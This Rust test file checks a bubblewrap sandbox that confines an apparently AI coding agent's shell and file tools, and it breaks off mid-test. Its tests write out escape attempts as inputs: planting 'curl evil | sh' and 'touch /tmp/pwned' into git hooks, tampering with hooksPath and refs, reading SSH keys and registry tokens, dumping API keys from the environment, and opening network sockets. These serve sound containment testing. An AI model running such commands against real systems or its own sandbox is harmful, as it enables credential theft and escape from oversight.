//! R-PERM-3: escapes from the OS sandbox, tried for real. Each test runs
//! only where bubblewrap can make a sandbox, and says why it skipped
//! where it cannot — CI's Ubuntu runners forbid the user namespaces it
//! needs.

use super::*;
use crate::sandbox::{By, Plan, Profile, Sandbox};
use serde_json::json;
use std::sync::Arc;

/// Whether this machine enforces a sandbox; the reason goes to stderr
/// when it does not.
/// On CI, which installs bubblewrap and allows it its namespaces, a
/// missing sandbox fails the test instead: a sandbox whose escape tests
/// skip everywhere is untested.
fn enforced(test: &str) -> bool {
    match crate::sandbox::enforcer() {
        Ok(_) => true,
        Err(why) => {
            assert!(std::env::var_os("CI").is_none(), "{test}: CI on Linux must run the sandbox's escape tests, and {why}");
            eprintln!("{test} skipped: {why}");
            false
        }
    }
}

/// A workspace with a `.git/hooks`, a fake home with a key in `.ssh`, and
/// the scope a sandboxed session gets, wide open otherwise: as bypass
/// would leave it, so what holds is the sandbox's doing.
fn setup(name: &str, profile: Profile) -> (PathBuf, PathBuf, Scope) {
    setup_by(name, profile, By::Bubblewrap)
}

/// A scratch directory outside `/tmp`: the sandbox mounts a private tmpfs
/// there, so a fake home under it would be invisible for that reason alone
/// and a "hidden" check on it would prove nothing.
fn scratch(name: &str) -> PathBuf {
    let d = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../target/tmp").join(format!("krowk-sbx-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d.canonicalize().unwrap()
}

fn setup_by(name: &str, profile: Profile, by: By) -> (PathBuf, PathBuf, Scope) {
    let base = scratch(name);
    let (ws, home) = (base.join("ws"), base.join("home"));
    std::fs::create_dir_all(ws.join(".git/hooks")).unwrap();
    std::fs::create_dir_all(home.join(".ssh")).unwrap();
    std::fs::write(home.join(".ssh/id_ed25519"), "PRIVATE KEY").unwrap();
    let mut scope = Scope::within(&ws);
    scope.outside = true;
    scope.open = true;
    let plan = Plan::new(Sandbox { profile, by }, &ws, &[], &[], &[], &[], Some(&home));
    scope.secrets.extend(plan.hidden.iter().cloned());
    scope.sandbox = Some(Arc::new(plan));
    (base, ws, scope)
}

async fn bash(ws: &Path, scope: &Scope, command: &str) -> (String, bool) {
    let env = ToolEnv { cwd: ws, permission_mode: PermissionMode::BypassPermissions, edit: EditTool::StrReplace, evidence: None };
    execute(BASH, &json!({ "command": command }), &env, scope.clone()).await
}

async fn tool(ws: &Path, scope: &Scope, name: &str, input: Value) -> (String, bool) {
    let env = ToolEnv { cwd: ws, permission_mode: PermissionMode::BypassPermissions, edit: EditTool::StrReplace, evidence: None };
    execute(name, &input, &env, scope.clone()).await
}

#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_a_sandboxed_command_writes_the_workspace_and_nothing_outside_it() {
    if !enforced("r_perm_3_a_sandboxed_command_writes_the_workspace_and_nothing_outside_it") {
        return;
    }
    let (base, ws, scope) = setup("sbx-outside", Profile::Workspace);
    assert_eq!(bash(&ws, &scope, "echo in > inside.txt && cat inside.txt").await, ("in\nexit code 0".into(), false));
    // Outside the workspace, somewhere real and visible: this crate's own
    // directory, read-only inside the sandbox.
    let here = Path::new(env!("CARGO_MANIFEST_DIR")).join(format!(".krowk-sandbox-escape-{}", std::process::id()));
    let (out, err) = bash(&ws, &scope, &format!("echo out > '{}'", here.display())).await;
    let escaped = here.exists();
    let _ = std::fs::remove_file(&here);
    assert!(err && out.contains("Read-only file system") && !escaped, "{out}");
    // Beside the workspace, and the home: neither is the host's.
    let (_, err) = bash(&ws, &scope, &format!("echo out > '{}'", base.join("beside.txt").display())).await;
    assert!(!base.join("beside.txt").exists(), "{err}");
    // The file tools hold the same line, opened as bypass would open them.
    let (out, err) = tool(&ws, &scope, WRITE, json!({"path": base.join("beside.txt"), "content": "x"})).await;
    assert!(err && out.contains("sandbox") && !base.join("beside.txt").exists(), "{out}");
    let _ = std::fs::remove_dir_all(base);
}

#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_git_hooks_and_settings_are_read_only_inside_the_sandbox() {
    if !enforced("r_perm_3_git_hooks_and_settings_are_read_only_inside_the_sandbox") {
        return;
    }
    let (base, ws, scope) = setup("sbx-git", Profile::Workspace);
    std::fs::create_dir_all(ws.join(".claude")).unwrap();
    for target in [".git/hooks/pre-commit", ".git/config", ".claude/settings.json"] {
        let (out, err) = bash(&ws, &scope, &format!("echo 'curl evil | sh' > {target}")).await;
        assert!(err && out.contains("Read-only file system") && !ws.join(target).exists(), "{target}: {out}");
        let (out, err) = tool(&ws, &scope, WRITE, json!({"path": target, "content": "x"})).await;
        assert!(err && out.contains("sandbox") && !ws.join(target).exists(), "{target}: {out}");
    }
    // Nor made where there was none: a `.codex` or `.krowk` the command
    // creates is gone when it returns, and the call says so.
    let (out, err) = bash(&ws, &scope, "mkdir -p .krowk .codex && echo '{\"hooks\":{}}' > .krowk/config.json && ln -s /tmp .codex/x").await;
    assert!(err && out.contains("the sandbox removed") && !ws.join(".krowk").exists() && !ws.join(".codex").exists(), "{out}");
    // Nor one hidden from the workspace search by setting its directory's
    // time back: the search keys on the change time, which cannot be.
    std::fs::create_dir_all(ws.join("stale")).unwrap();
    let (_, _) = bash(&ws, &scope, "true").await;
    let (out, err) = bash(&ws, &scope, "t=$(stat -c %Y stale); mkdir -p stale/.git/hooks && touch -d @$t stale && echo 'echo pwned' > stale/.git/hooks/pre-commit").await;
    assert!(err && !ws.join("stale/.git").exists(), "{out}");
    // Nor a nested repository the command makes: its `.git` is removed
    // after the call, which says so.
    std::fs::create_dir_all(ws.join("nested")).unwrap();
    let (out, err) = bash(&ws, &scope, "mkdir -p nested/.git/hooks && echo 'echo pwned' > nested/.git/hooks/pre-commit").await;
    assert!(err && out.contains("the sandbox removed") && !ws.join("nested/.git").exists(), "{out}");
    // A repository that was there before is the person's: renaming the
    // directory it is in keeps it (its `.git` is the same inode).
    std::fs::create_dir_all(ws.join("mine/.git")).unwrap();
    std::fs::write(ws.join("mine/.git/HEAD"), "ref: refs/heads/main\n").unwrap();
    let (out, _) = bash(&ws, &scope, "mv mine moved").await;
    assert!(ws.join("moved/.git/HEAD").exists(), "a renamed repository's .git was removed: {out}");
    // A FIFO where a `.git` or its config would be does not hang the
    // search the next call makes.
    let (_, _) = bash(&ws, &scope, "mkdir -p fifo && mkfifo fifo/.git; mkdir -p f2/.git && mkfifo f2/.git/config").await;
    let r = tokio::time::timeout(Duration::from_secs(10), bash(&ws, &scope, "echo alive")).await;
    assert!(r.is_ok_and(|(o, _)| o.contains("alive")), "the workspace search hung on a FIFO");
    // Not by a symlink in the workspace either.
    let (out, err) = bash(&ws, &scope, "ln -s .git/hooks h && echo x > h/post-checkout").await;
    assert!(err && !ws.join(".git/hooks/post-checkout").exists(), "{out}");
    let _ = std::fs::remove_dir_all(base);
}

#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_credentials_the_sandbox_hides_cannot_be_read() {
    if !enforced("r_perm_3_credentials_the_sandbox_hides_cannot_be_read") {
        return;
    }
    let (base, ws, scope) = setup("sbx-ssh", Profile::Workspace);
    let key = base.join("home/.ssh/id_ed25519");
    let (out, _) = bash(&ws, &scope, &format!("cat '{}'; ls -A '{}'", key.display(), key.parent().unwrap().display())).await;
    assert!(!out.contains("PRIVATE KEY") && out.contains("No such file"), "{out}");
    let (out, err) = tool(&ws, &scope, READ, json!({ "path": key })).await;
    assert!(err && !out.contains("PRIVATE KEY") && out.contains("hidden by the workspace sandbox"), "{out}");
    let (out, _) = tool(&ws, &scope, GREP, json!({ "pattern": "PRIVATE", "path": base.join("home") })).await;
    assert!(!out.contains("PRIVATE KEY"), "{out}");
    // Nor through a link the sandboxed command makes in the workspace.
    assert!(!bash(&ws, &scope, &format!("ln -s '{}' key", key.display())).await.1);
    let (out, _) = tool(&ws, &scope, GREP, json!({ "pattern": "PRIVATE" })).await;
    assert!(!out.contains("PRIVATE KEY"), "{out}");
    let (out, err) = tool(&ws, &scope, READ, json!({ "path": "key" })).await;
    assert!(err && !out.contains("PRIVATE KEY"), "{out}");
    let _ = std::fs::remove_dir_all(base);
}

#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_strict_and_read_only_have_no_network_and_read_only_writes_nothing() {
    if !enforced("r_perm_3_strict_and_read_only_have_no_network_and_read_only_writes_nothing") {
        return;
    }
    // A port on the host's loopback, listening: the workspace sandbox
    // reaches it, strict does not.
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let connect = format!("exec 3<>/dev/tcp/127.0.0.1/{port} && echo connected");
    let (_, ws, open) = setup("sbx-net-open", Profile::Workspace);
    assert!(bash(&ws, &open, &connect).await.0.contains("connected"), "the workspace sandbox keeps the network");
    for profile in [Profile::Strict, Profile::ReadOnly] {
        let (base, ws, scope) = setup(&format!("sbx-net-{}", profile.name()), profile);
        let (out, err) = bash(&ws, &scope, &connect).await;
        assert!(err && !out.contains("connected"), "{profile:?}: {out}");
        // No name resolves — no resolver socket is mounted — and a resolver
        // named by its address is unreachable too.
        let (out, _) = bash(&ws, &scope, "timeout 5 getent hosts example.com && echo resolved; echo q > /dev/udp/1.1.1.1/53 && echo sent").await;
        assert!(!out.contains("resolved") && !out.contains("sent") && out.contains("unreachable"), "{profile:?}: {out}");
        let _ = std::fs::remove_dir_all(base);
    }
    let (base, ws, ro) = setup("sbx-ro", Profile::ReadOnly);
    let (out, err) = bash(&ws, &ro, "echo x > a.txt").await;
    assert!(err && out.contains("Read-only file system") && !ws.join("a.txt").exists(), "{out}");
    let (out, err) = tool(&ws, &ro, WRITE, json!({"path": "a.txt", "content": "x"})).await;
    assert!(err && out.contains("writes nothing"), "{out}");
    // Strict hides the home outside the workspace, the key and all.
    let (base2, ws2, strict) = setup("sbx-strict-home", Profile::Strict);
    std::fs::create_dir_all(base2.join("home/src")).unwrap();
    std::fs::write(base2.join("home/src/notes.txt"), "mine").unwrap();
    let (out, _) = bash(&ws2, &strict, &format!("cat '{}' '{}'", base2.join("home/src/notes.txt").display(), base2.join("home/.ssh/id_ed25519").display())).await;
    assert!(!out.contains("mine") && !out.contains("PRIVATE KEY"), "{out}");
    let (out, err) = tool(&ws2, &strict, READ, json!({ "path": base2.join("home/src/notes.txt") })).await;
    assert!(err && out.contains("hidden by the strict sandbox"), "{out}");
    let _ = std::fs::remove_dir_all(base);
    let _ = std::fs::remove_dir_all(base2);
}

#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_a_sandboxed_command_gets_only_the_allowlisted_environment() {
    if !enforced("r_perm_3_a_sandboxed_command_gets_only_the_allowlisted_environment") {
        return;
    }
    let planted = ["ANTHROPIC_API_KEY", "OPENAI_API_KEY", "XAI_API_KEY", "GITHUB_TOKEN", "KROWK_SYNC_TOKEN", "AWS_SECRET_ACCESS_KEY", "SSH_AUTH_SOCK", "GPG_AGENT_INFO"];
    let (base, ws, scope) = setup("sbx-env", Profile::Workspace);
    let dump = "env; tr '\\0' '\\n' < /proc/1/environ";
    // bubblewrap started with a parent's keys in its environment, as
    // krowk's would be: none reaches the command (`--clearenv`). Set on the
    // child only, so no other test's environment moves.
    let (program, args) = crate::sandbox::bash(scope.sandbox.as_deref().unwrap(), "env").unwrap();
    let mut direct = std::process::Command::new(&program);
    direct.args(&args).current_dir(&ws);
    for k in planted {
        direct.env(k, "sk-planted-secret");
    }
    let got = String::from_utf8_lossy(&direct.output().unwrap().stdout).into_owned();
    assert!(got.contains("PATH=") && !got.contains("sk-planted-secret"), "{got}");
    for k in planted {
        assert!(!got.contains(&format!("{k}=")), "{k} reached the sandbox: {got}");
    }
    // And through the tool: the command's environment and bubblewrap's own
    // (pid 1's, which the command can read) are both the allowlist.
    let (out, err) = bash(&ws, &scope, dump).await;
    assert!(!err, "{out}");
    let names: std::collections::BTreeSet<&str> = out.lines().filter_map(|l| l.split_once('=').map(|(k, _)| k)).collect();
    let allowed = |k: &&str| ["PATH", "HOME", "TERM", "LANG", "USER", "LOGNAME", "TMPDIR", "PWD", "SHLVL", "_", "OLDPWD", "RUSTUP_HOME", "CARGO_HOME"].contains(k) || k.starts_with("LC_");
    assert!(names.iter().all(allowed), "only the allowlist: {names:?}");
    assert!(out.contains(&format!("HOME={}", crate::sandbox::HOME)), "{out}");
    let _ = std::fs::remove_dir_all(base);
}

#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_a_sandboxed_command_inherits_no_descriptor_and_has_its_own_session() {
    if !enforced("r_perm_3_a_sandboxed_command_inherits_no_descriptor_and_has_its_own_session") {
        return;
    }
    // A descriptor this process holds without close-on-exec, as one handed
    // down by krowk's own parent would be.
    let f = std::fs::File::open("/dev/null").unwrap();
    let fd = std::os::fd::IntoRawFd::into_raw_fd(f);
    // SAFETY: the descriptor was just opened here and is closed below.
    unsafe { libc::fcntl(fd, libc::F_SETFD, 0) };
    let (base, ws, scope) = setup("sbx-fd", Profile::Workspace);
    // The descriptors of a process the shell starts outside any pipeline —
    // listing the shell's own from inside one would catch that pipeline's
    // pipe, still open while it forks — written to a file, not a pipe.
    let (out, err) = bash(&ws, &scope, "sleep 5 & p=$!; ls /proc/$p/fd > /tmp/fds; ls -l /proc/$p/fd > /tmp/fdl; kill $p; sort -n /tmp/fds | tr '\\n' ' '; echo; ps -o sid= -p $$; echo $$; cat /tmp/fdl").await;
    unsafe { libc::close(fd) };
    let mut lines = out.lines();
    assert_eq!(lines.next(), Some("0 1 2 "), "{out}");
    // Its own session: the shell leads none of krowk's.
    let (sid, pid) = (lines.next().unwrap_or("").trim().to_string(), lines.next().unwrap_or("").trim().to_string());
    // SAFETY: getsid(0) reads this process's session id.
    let ours = unsafe { libc::getsid(0) };
    assert!(!err && sid != ours.to_string() && !pid.is_empty(), "{out}");
    // A timeout still kills what the command started, inside its own
    // session and namespace.
    let started = std::time::Instant::now();
    let env = ToolEnv { cwd: &ws, permission_mode: PermissionMode::BypassPermissions, edit: EditTool::StrReplace, evidence: None };
    let (out, err) = execute(BASH, &json!({"command": "sleep 7.31 & sleep 7.31", "timeout_ms": 300}), &env, scope.clone()).await;
    assert!(err && out.contains("timed out") && started.elapsed() < Duration::from_secs(3), "{out}");
    tokio::time::sleep(Duration::from_millis(300)).await;
    let alive = std::process::Command::new("pgrep").args(["-f", "sleep 7.31"]).output().map(|o| o.status.success()).unwrap_or(false);
    assert!(!alive, "a sandboxed command outlived its timeout");
    let _ = std::fs::remove_dir_all(base);
}

/// R-PERM-3: inside a container, where commands run as they are, the file
/// tools still hold the profile's lines — no mode opens `.git/hooks`, a
/// path outside the workspace or a hidden `~/.ssh` to them.
#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_in_a_container_the_file_tools_keep_the_sandboxes_fences() {
    let (base, ws, scope) = setup_by("sbx-container", Profile::Workspace, By::Container);
    for target in [ws.join(".git/hooks/pre-commit"), base.join("outside.txt")] {
        let (out, err) = tool(&ws, &scope, WRITE, json!({"path": target, "content": "x"})).await;
        assert!(err && out.contains("sandbox") && !target.exists(), "{}: {out}", target.display());
    }
    let (out, err) = tool(&ws, &scope, READ, json!({ "path": base.join("home/.ssh/id_ed25519") })).await;
    assert!(err && !out.contains("PRIVATE KEY"), "{out}");
    assert!(!tool(&ws, &scope, WRITE, json!({"path": "a.txt", "content": "x"})).await.1, "the workspace is written");
    // Commands run as they are: the container is their boundary, and no
    // bubblewrap is needed for them.
    assert_eq!(bash(&ws, &scope, "echo hi").await, ("hi\nexit code 0".into(), false));
    let _ = std::fs::remove_dir_all(base);
}

/// R-PERM-3: the Rust toolchain runs inside the sandbox — its homes are
/// bound read-only and named to the command — and cargo's registry
/// credentials in them stay unreadable.
#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_cargo_runs_in_the_sandbox_and_its_credentials_stay_hidden() {
    if !enforced("r_perm_3_cargo_runs_in_the_sandbox_and_its_credentials_stay_hidden") {
        return;
    }
    let real_home = std::env::var_os("HOME").map(PathBuf::from);
    let rustup = std::env::var_os("RUSTUP_HOME").map(PathBuf::from).or_else(|| real_home.as_ref().map(|h| h.join(".rustup")));
    if !rustup.as_ref().is_some_and(|r| r.is_dir()) || std::process::Command::new("cargo").arg("--version").output().is_err() {
        assert!(std::env::var_os("CI").is_none(), "CI must have a rustup toolchain to run this check");
        eprintln!("r_perm_3_cargo_runs_in_the_sandbox_and_its_credentials_stay_hidden skipped: no rustup toolchain here");
        return;
    }
    let (base, ws, mut scope) = setup("sbx-cargo", Profile::Workspace);
    // A cargo home of the test's own, holding a registry token.
    let cargo_home = base.join("home/.cargo");
    std::fs::create_dir_all(cargo_home.join("registry")).unwrap();
    std::fs::write(cargo_home.join("credentials.toml"), "[registry]\ntoken = \"cio-planted-token\"\n").unwrap();
    let env = |k: &str| match k {
        "CARGO_HOME" => Some(cargo_home.clone().into_os_string()),
        "RUSTUP_HOME" => rustup.clone().map(PathBuf::into_os_string),
        _ => None,
    };
    let plan = Plan::new_in(Sandbox { profile: Profile::Workspace, by: By::Bubblewrap }, &ws, &[], &[], &[], &[], Some(&base.join("home")), &env);
    scope.secrets.extend(plan.hidden.iter().cloned());
    scope.sandbox = Some(Arc::new(plan));
    let (out, err) = bash(&ws, &scope, "cargo --version && echo \"CARGO_HOME=$CARGO_HOME\"").await;
    assert!(!err && out.starts_with("cargo ") && out.contains(&format!("CARGO_HOME={}", cargo_home.display())), "{out}");
    let (out, _) = bash(&ws, &scope, "cat \"$CARGO_HOME/credentials.toml\"; echo x > \"$CARGO_HOME/registry/planted\"").await;
    assert!(!out.contains("cio-planted-token") && !cargo_home.join("registry/planted").exists(), "hidden, and read-only: {out}");
    let (out, err) = tool(&ws, &scope, READ, json!({ "path": cargo_home.join("credentials.toml") })).await;
    assert!(err && !out.contains("cio-planted-token"), "{out}");
    let _ = std::fs::remove_dir_all(base);
}

/// git in a test repository, through krowk's own git (hooks off), with
/// none of this machine's config: what it prints, trimmed.
fn git(dir: &Path, args: &[&str]) -> String {
    let o = krowk_api::git::command(dir).unwrap().args(["-c", "user.name=t", "-c", "user.email=t@t"]).args(args).env("GIT_CONFIG_GLOBAL", "/dev/null").env("GIT_CONFIG_NOSYSTEM", "1").output().unwrap();
    assert!(o.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&o.stderr));
    String::from_utf8_lossy(&o.stdout).trim().to_string()
}

/// A repository with `main` checked out, in a fake home the sandbox hides,
/// whose own config names who commits; two worktrees krowk made for agents
/// under that home's worktrees root (`.local/share/krowk/worktrees/
/// <repo-id>/<hex>`, branches `krowk/abcd1234` and `krowk/feedbeef`); and
/// the person's own linked worktree, `own`, beside the repository. The
/// environment names only the fake home, which has no `.gitconfig`.
struct Repo {
    base: PathBuf,
    home: PathBuf,
    main: PathBuf,
    wt: PathBuf,
    own: PathBuf,
}

impl Repo {
    fn new(name: &str) -> Repo {
        let base = scratch(name);
        let home = base.join("home");
        let main = home.join("src/repo");
        std::fs::create_dir_all(&main).unwrap();
        git(&main, &["init", "-q", "-b", "main"]);
        git(&main, &["config", "user.name", "Wt Four"]);
        git(&main, &["config", "user.email", "wt4@example.com"]);
        std::fs::write(main.join("a.txt"), "a\n").unwrap();
        git(&main, &["add", "-A"]);
        git(&main, &["commit", "-q", "-m", "first"]);
        let root = home.join(".local/share/krowk/worktrees/0123456789abcdef");
        let wt = root.join("abcd1234");
        git(&main, &["worktree", "add", "-q", "--no-track", "-b", "krowk/abcd1234", &wt.to_string_lossy(), "main"]);
        git(&main, &["worktree", "add", "-q", "--no-track", "-b", "krowk/feedbeef", &root.join("feedbeef").to_string_lossy(), "main"]);
        let own = home.join("src/own");
        git(&main, &["worktree", "add", "-q", "-b", "feature", &own.to_string_lossy(), "main"]);
        Repo { base, home, main, wt, own }
    }

    fn env(&self) -> impl Fn(&str) -> Option<std::ffi::OsString> + use<> {
        let home = self.home.clone();
        move |k| (k == "HOME").then(|| home.clone().into_os_string())
    }

    fn plan(&self, ws: &Path) -> Plan {
        Plan::new_in(Sandbox { profile: Profile::Workspace, by: By::Bubblewrap }, ws, &[], &[], &[], &[], Some(&self.home), &self.env())
    }

    /// The scope of a sandboxed session in `ws`, wide open otherwise.
    fn scope(&self, ws: &Path) -> Scope {
        let mut scope = Scope::within(ws);
        scope.outside = true;
        scope.open = true;
        let plan = self.plan(ws);
        scope.secrets.extend(plan.hidden.iter().cloned());
        scope.sandbox = Some(Arc::new(plan));
        scope
    }
}

/// Worktrees WT4: a worktree is krowk's only when it is what krowk makes —
/// under the root, led to from a real common git directory and back, on a
/// `krowk/<8 hex>` branch — and every other one keeps today's plan.
#[test]
fn wt4_only_a_worktree_krowk_made_is_opened_to_a_commit() {
    let r = Repo::new("wt4-managed");
    let root = r.home.join(".local/share/krowk/worktrees");
    let common = r.main.join(".git");
    let w = crate::sandbox::managed_worktree(&r.wt, &root).expect("krowk's worktree");
    assert_eq!((w.common.clone(), w.admin.clone(), w.hex.as_str()), (common.clone(), common.join("worktrees/abcd1234"), "abcd1234"));
    let plan = r.plan(&r.wt);
    assert_eq!(plan.git, [(common.clone(), false), (common.join("objects"), true), (common.join("refs/heads/krowk"), true), (common.join("logs/refs/heads/krowk"), true), (common.join("worktrees/abcd1234"), true)]);
    for p in ["config", "hooks", "info", "HEAD", "packed-refs", "worktrees/own", "worktrees/feedbeef", "refs/heads/krowk/feedbeef", "worktrees/abcd1234/commondir"] {
        assert!(plan.read_only.contains(&common.join(p)), "{p}: {:?}", plan.read_only);
    }
    assert!(!plan.read_only.contains(&common.join("refs/heads/krowk/abcd1234")), "its own branch is its to move");
    assert_eq!(plan.identity, Some(("Wt Four".into(), "wt4@example.com".into())), "as git resolves it in the worktree");
    let args = plan.bwrap_args();
    let at = |x: &str, v: &Path| args.windows(3).position(|w| w[0] == x && w[1] == v.to_string_lossy()).unwrap_or_else(|| panic!("{x} {}", v.display()));
    assert!(at("--bind", &r.wt) < at("--ro-bind-try", &common) && at("--ro-bind-try", &common) < at("--bind-try", &common.join("refs/heads/krowk")), "the common directory read-only first");
    assert!(at("--bind-try", &common.join("refs/heads/krowk")) < at("--ro-bind-try", &common.join("refs/heads/krowk/feedbeef")), "the read-only ones win");
    for v in ["GIT_AUTHOR_NAME", "GIT_COMMITTER_EMAIL"] {
        assert!(args.windows(2).any(|w| w[0] == "--setenv" && w[1] == v), "{v}");
    }
    // No identity named anywhere git looks: none handed in, git's own
    // error stands.
    git(&r.main, &["config", "--unset", "user.email"]);
    assert_eq!(r.plan(&r.wt).identity, None);
    // The person's own linked worktree, and the main checkout: as today.
    assert_eq!(crate::sandbox::managed_worktree(&r.own, &root), None);
    for ws in [&r.own, &r.main] {
        let plan = r.plan(ws);
        assert!(plan.git.is_empty() && plan.identity.is_none() && plan.read_only.contains(&ws.join(".git")), "{}", ws.display());
    }
    // Not the root's subdirectory, not on a krowk branch, not under the
    // root the environment names, not with a `.git` leading elsewhere.
    assert_eq!(crate::sandbox::managed_worktree(&root.join("0123456789abcdef"), &root), None);
    assert_eq!(crate::sandbox::managed_worktree(&r.wt, &r.base.join("elsewhere")), None);
    let head = common.join("worktrees/abcd1234/HEAD");
    for other in ["ref: refs/heads/feature2\n", "ref: refs/heads/krowk/ABCD1234\n", "ref: refs/heads/krowk/abcd12345\n", "ref: refs/heads/krowk/../main\n"] {
        std::fs::write(&head, other).unwrap();
        assert_eq!(crate::sandbox::managed_worktree(&r.wt, &root), None, "{other}");
    }
    std::fs::write(&head, "ref: refs/heads/krowk/abcd1234\n").unwrap();
    // A gitdir file leading to an admin directory that does not lead back.
    let fake = r.base.join("fake/.git/worktrees/abcd1234");
    std::fs::create_dir_all(&fake).unwrap();
    for d in ["objects", "refs"] {
        std::fs::create_dir_all(r.base.join("fake/.git").join(d)).unwrap();
    }
    std::fs::write(r.base.join("fake/.git/HEAD"), "ref: refs/heads/main\n").unwrap();
    std::fs::write(fake.join("HEAD"), "ref: refs/heads/krowk/abcd1234\n").unwrap();
    std::fs::write(fake.join("commondir"), "../..\n").unwrap();
    std::fs::write(fake.join("gitdir"), format!("{}\n", r.base.join("other/.git").display())).unwrap();
    let wt_git = std::fs::read_to_string(r.wt.join(".git")).unwrap();
    std::fs::write(r.wt.join(".git"), format!("gitdir: {}\n", fake.display())).unwrap();
    assert_eq!(crate::sandbox::managed_worktree(&r.wt, &root), None);
    std::fs::write(fake.join("gitdir"), format!("{}\n", r.wt.join(".git").display())).unwrap();
    assert!(crate::sandbox::managed_worktree(&r.wt, &root).is_some(), "the positive control");
    std::fs::write(r.wt.join(".git"), wt_git).unwrap();
    let _ = std::fs::remove_dir_all(&r.base);
}

/// Worktrees WT4: an agent in a worktree krowk made commits from inside
/// the sandbox, as the person, and the commit is the repository's.
#[tokio::test(flavor = "current_thread")]
async fn wt4_a_sandboxed_agent_commits_in_a_krowk_worktree() {
    if !enforced("wt4_a_sandboxed_agent_commits_in_a_krowk_worktree") {
        return;
    }
    let r = Repo::new("wt4-commit");
    let scope = r.scope(&r.wt);
    let (out, err) = bash(&r.wt, &scope, "echo new > new.txt && git add -A && git commit -q -m x && git status --porcelain").await;
    assert!(!err, "{out}");
    assert_eq!(git(&r.main, &["log", "-1", "--format=%s %an <%ae> %cn <%ce>", "krowk/abcd1234"]), "x Wt Four <wt4@example.com> Wt Four <wt4@example.com>");
    assert_eq!(git(&r.main, &["show", "krowk/abcd1234:new.txt"]), "new");
    assert_eq!(git(&r.main, &["log", "-1", "--format=%s", "main"]), "first", "main did not move");
    // A branch of its own under `krowk/` it may make.
    let (out, err) = bash(&r.wt, &scope, "git branch krowk/abcd1234-2").await;
    assert!(!err && git(&r.main, &["rev-parse", "krowk/abcd1234-2"]) == git(&r.main, &["rev-parse", "krowk/abcd1234"]), "{out}");
    let _ = std::fs::remove_dir_all(&r.base);
}

/// Worktrees WT4: what a commit does not need stays read-only from the
/// same sandbox — each write tried on its own.
#[tokio::test(flavor = "current_thread")]
async fn wt4_a_krowk_worktree_cannot_touch_what_runs_or_what_another_checkout_is_on() {
    if !enforced("wt4_a_krowk_worktree_cannot_touch_what_runs_or_what_another_checkout_is_on") {
        return;
    }
    let r = Repo::new("wt4-fences");
    let scope = r.scope(&r.wt);
    let c = r.main.join(".git");
    // A `packed-refs` to append to: a tag, packed.
    git(&r.main, &["tag", "v0"]);
    git(&r.main, &["pack-refs"]);
    assert!(c.join("packed-refs").is_file());
    // A commit of its own first, so moving `main` to it would be a move.
    let (out, err) = bash(&r.wt, &scope, "echo b > b.txt && git add -A && git commit -q -m b").await;
    assert!(!err, "{out}");
    let main_was = git(&r.main, &["rev-parse", "main"]);
    let ours = git(&r.main, &["rev-parse", "krowk/abcd1234"]);
    let read = |p: &Path| std::fs::read(p).ok();
    let rofs = "Read-only file system";

    let config = read(&c.join("config"));
    let (out, err) = bash(&r.wt, &scope, &format!("printf '[core]\\n\\thooksPath = /tmp\\n' >> '{}'", c.join("config").display())).await;
    assert!(err && out.contains(rofs) && read(&c.join("config")) == config, "<common>/config: {out}");

    let (out, err) = bash(&r.wt, &scope, &format!("echo 'touch /tmp/pwned' > '{}'", c.join("hooks/post-commit").display())).await;
    assert!(err && out.contains(rofs) && !c.join("hooks/post-commit").exists(), "<common>/hooks/post-commit: {out}");

    let (out, err) = bash(&r.wt, &scope, &format!("echo '* filter=evil' > '{}'", c.join("info/attributes").display())).await;
    assert!(err && out.contains(rofs) && !c.join("info/attributes").exists(), "<common>/info/attributes: {out}");

    let head = read(&c.join("HEAD"));
    let (out, err) = bash(&r.wt, &scope, &format!("echo 'ref: refs/heads/krowk/abcd1234' > '{}'", c.join("HEAD").display())).await;
    assert!(err && out.contains(rofs) && read(&c.join("HEAD")) == head, "<common>/HEAD: {out}");

    let (out, err) = bash(&r.wt, &scope, "git update-ref refs/heads/main HEAD").await;
    assert!(err && git(&r.main, &["rev-parse", "main"]) == main_was && !c.join("refs/heads/main.lock").exists(), "refs/heads/main: {out}");
    let (out, err) = bash(&r.wt, &scope, &format!("git rev-parse HEAD > '{}'", c.join("refs/heads/main").display())).await;
    assert!(err && out.contains(rofs) && git(&r.main, &["rev-parse", "main"]) == main_was, "refs/heads/main, written: {out}");
    // Nor by putting a new `refs/heads` where the old one was.
    let (out, err) = bash(&r.wt, &scope, &format!("cd '{}' && mv heads old && mkdir heads && git -C '{}' rev-parse HEAD > heads/main", c.join("refs").display(), r.wt.display())).await;
    assert!(err && c.join("refs/heads/main").is_file() && !c.join("refs/old").exists() && git(&r.main, &["rev-parse", "main"]) == main_was, "refs/heads, renamed: {out}");

    // Nor what `main` shows, by a replacement for its commit.
    let (out, err) = bash(&r.wt, &scope, &format!("git replace {main_was} HEAD")).await;
    assert!(err && !c.join("refs/replace").exists(), "git replace: {out}");
    let (out, err) = bash(&r.wt, &scope, &format!("mkdir -p '{0}/refs/replace' && echo {ours} > '{0}/refs/replace/{main_was}'", c.display())).await;
    assert!(err && out.contains(rofs) && !c.join("refs/replace").exists(), "refs/replace, written: {out}");
    let packed = read(&c.join("packed-refs"));
    let (out, err) = bash(&r.wt, &scope, &format!("echo '{ours} refs/replace/{main_was}' >> '{}'", c.join("packed-refs").display())).await;
    assert!(err && out.contains(rofs) && read(&c.join("packed-refs")) == packed && git(&r.main, &["log", "-1", "--format=%s", "main"]) == "first", "packed-refs: {out}");

    // A tag is a ref outside `krowk/`: the accepted cost.
    let (out, err) = bash(&r.wt, &scope, "git tag t").await;
    assert!(err && !c.join("refs/tags/t").exists(), "git tag: {out}");

    let feedbeef = git(&r.main, &["rev-parse", "krowk/feedbeef"]);
    let (out, err) = bash(&r.wt, &scope, "git update-ref refs/heads/krowk/feedbeef HEAD").await;
    assert!(err && git(&r.main, &["rev-parse", "krowk/feedbeef"]) == feedbeef, "another agent's branch: {out}");
